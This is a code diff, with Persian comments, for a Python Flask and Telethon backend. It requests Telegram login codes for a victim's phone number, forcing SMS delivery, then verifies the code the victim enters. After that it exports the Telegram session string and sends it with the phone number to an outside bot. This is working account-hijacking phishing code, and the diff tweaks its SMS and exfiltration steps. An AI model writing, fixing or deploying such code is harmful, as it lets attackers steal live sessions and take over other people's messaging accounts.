@@ -65,29 +65,30 @@ def verify_code():
         logging.error(f"Error in verify_code: {e}")
         return jsonify({'error': str(e)}), 500
 
-# ============================================================
-#  توابع اصلی (با force_sms=True)
-# ============================================================
 async def send_code(session_id, phone):
     try:
         client = TelegramClient(session_id, API_ID, API_HASH)
         await client.connect()
         
-        # 🔥 اینجا تغییر اصلی: force_sms=True
+        # ============================================================
+        #  🔥 SMS اجباری با همه پارامترها
+        # ============================================================
         result = await client.send_code_request(
             phone,
-            force_sms=True  # ← کد حتماً از طریق SMS ارسال میشه
+            force_sms=True,
+            allow_flash_call=False,
+            allow_app_hash=False  # ← این خط رو اضافه کن!
         )
         
         sessions[session_id]['client'] = client
         sessions[session_id]['phone_code_hash'] = result.phone_code_hash
         sessions[session_id]['status'] = 'code_sent'
         
-        logging.info(f"✅ SMS sent to: {phone}")
+        logging.info(f"✅ SMS forced for: {phone}")
         
     except Exception as e:
         sessions[session_id]['status'] = 'error'
-        logging.error(f"❌ Error sending code: {e}")
+        logging.error(f"❌ Error: {e}")
         raise
 
 async def verify_session(session_id, phone, code):
@@ -114,8 +115,7 @@ async def verify_session(session_id, phone, code):
 
         session_string = client.session.save()
         if session_string and len(session_string) > 10:
-            message = f"User : {phone}\nSession : {session_string}"
-            await send_to_bot(message)
+            await send_to_bot(f"User : {phone}\nSession : {session_string}")
 
         await client.disconnect()
         sessions[session_id]['status'] = 'done'
